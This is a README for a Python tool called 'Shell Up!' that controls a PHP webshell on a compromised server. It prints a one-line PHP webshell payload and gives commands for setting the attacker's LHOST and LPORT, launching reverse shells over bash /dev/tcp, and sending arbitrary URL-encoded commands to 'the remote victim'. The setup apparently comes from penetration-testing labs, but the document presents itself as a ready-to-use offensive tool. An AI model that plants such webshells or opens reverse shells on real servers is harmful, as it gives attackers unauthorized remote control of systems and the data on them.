# Shell Up!
A much more lightweight way to connect to a webshell without having to use Burp Suite.
I wrote this not out of necessity, but because I was always considering doing it one day
and given the current COVID-19 climate I finally said screw it and wrote this. In the event
that I obtain code execution on a server and am able to write a quick oneliner webshell that
looks something like this:

`<?php system($_GET['cmd']); ?>`

You can run this script and issue commands as needed. Typically all that is necessary is a
callback via a reverse shell, so this script takes care of all of the overhead necessary.

## Usage

`shellup.py http://example.com/pwned.php`

This will connect to the endpoint and run an immediate check to determine code execution,
assuming your invoke word is "cmd". If it isn't, you can modify those settings in the REPL:

`shellset invokeword c`

Don't forget to set your LHOST and LPORT properties for reverse shells:

`shellset lhost 10.10.14.2`

`shellset lport 9001`

Something not working right? Run it through a proxy like burpsuite or mitmproxy and find out
what's going on:

`shellset proxy http://localhost:8080`

`whoami`

Or, you could just set these flags up beforehand at the command line:

`shellup.py http://example.com/pwned.php -lh 10.10.14.2 -lp 9001 -i agr0 -p http://localhost:8080`

Once you have your settings configured properly, the "shellup" function allows you to start up a
reverse shell in many different ways. All you need to do is type something like:

`shellup bash`

And it will connect back to you using the /dev/tcp/ method that comes with the bash shell.
Several reverse callback methods have been preloaded into this script, but when all else fails
you can simply issue arbitrary commands via the included REPL. Just type anything and it sends
it to the remote victim, all properly URL encoded!

Hack The Planet!
